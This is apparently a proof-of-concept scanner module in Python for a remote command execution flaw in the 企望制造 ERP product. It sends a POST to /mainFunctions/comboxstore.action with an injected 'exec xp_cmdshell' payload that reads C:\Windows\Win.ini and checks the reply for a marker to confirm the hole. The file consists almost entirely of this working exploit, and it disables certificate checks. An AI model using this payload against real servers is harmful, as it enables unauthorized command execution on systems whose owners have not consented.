#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/F749_vFtBPgrcp6iE2XuCA',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '企望制造 ERP comboxstore.action 远程命令执行',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded'
      }
  target = '/mainFunctions/comboxstore.action'
  data = "comboxsql=exec%20xp_cmdshell%20'type%20C:\Windows\Win.ini'"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "for 16-bit app support" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret